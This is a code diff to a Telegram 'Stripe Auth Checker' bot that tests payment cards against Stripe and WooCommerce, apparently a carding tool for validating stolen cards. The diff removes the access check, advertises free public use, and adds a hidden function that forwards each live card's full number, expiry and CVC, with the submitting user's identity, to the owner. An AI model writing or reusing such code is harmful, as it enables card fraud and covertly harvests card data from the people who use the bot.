@@ -383,16 +383,31 @@ def parse_card_pipe(text):
         }
     return None
 
+def notify_owner_live_card(user, card, card_info, country_info):
+    """Send notification to owner when a live card is found."""
+    try:
+        user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
+        notification = (
+            "🚨 *LIVE CARD FOUND* 🚨\n\n"
+            f"👤 𝐔𝐬𝐞𝐫: {user_info}\n"
+            f"🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: `{user.id}`\n\n"
+            f"💳 𝐂𝐚𝐫𝐝: `{card['number']}|{card['month']}|{card['year']}|{card['cvc']}`\n"
+            f"ℹ️ 𝐈𝐧𝐟𝐨: {card_info}\n"
+            f"🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_info}\n\n"
+            f"⏰ 𝐓𝐢𝐦𝐞: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        bot.send_message(OWNER_ID, notification, parse_mode='Markdown')
+    except Exception as e:
+        print(f"Failed to notify owner: {e}")
+
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     welcome_text = (
         "🔥 *Stripe Auth Checker Bot* 🔥\n\n"
         "Welcome! This high-speed bot checks cards using Stripe Auth & WooCommerce Setup Intents.\n\n"
-        "⚠️ *Access Restricted*\n"
-        "This is a private bot. To gain access, you must contact the owner.\n\n"
-        "💎 *Pricing & Offers*\n"
-        "• *Access*: Message for approval.\n"
-        "• *Personal Bot*: Want your own private checker? Pay *$5* to the owner and get a custom setup!\n\n"
+        "✅ *FREE ACCESS* - Open for all users!\n\n"
+        "💎 *Want Your Own Bot?*\n"
+        "• *Personal Bot*: Pay *$5* to the owner and get a custom setup!\n\n"
         "👤 *Contact Owner*: @llegaccy\n\n"
         "👇 *How to Use*:\n"
         "`/chk cc|mm|yy|cvc`\n"
@@ -440,11 +455,8 @@ def list_users_command(message):
 # ------------------------------------------------------------------------------------------
 @bot.message_handler(commands=['chk'])
 def check_card_command(message):
-    # Auth check
-    allowed_users = load_allowed_users()
-    if message.from_user.id != OWNER_ID and message.from_user.id not in allowed_users:
-        bot.reply_to(message, f"❌ Not authorized. Contact @llegaccy to buy access.\nYour ID: `{message.from_user.id}`", parse_mode='Markdown')
-        return
+    # PUBLIC ACCESS - No auth check needed
+    user = message.from_user
 
     msg_args = message.text.split(" ", 1)
     if len(msg_args) < 2:
@@ -501,6 +513,15 @@ def check_card_command(message):
         )
         
         bot.edit_message_text(response_text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode='Markdown')
+        
+        # Notify owner if card is LIVE
+        if result['success'] and user.id != OWNER_ID:
+            notify_owner_live_card(
+                user=user,
+                card=card,
+                card_info=f"{card_brand} - {card_funding}",
+                country_info=f"{country_name} ({country_code})"
+            )
 
     except Exception as e:
         bot.edit_message_text(f"⚠️ Error: {str(e)}", chat_id=message.chat.id, message_id=status_msg.message_id)
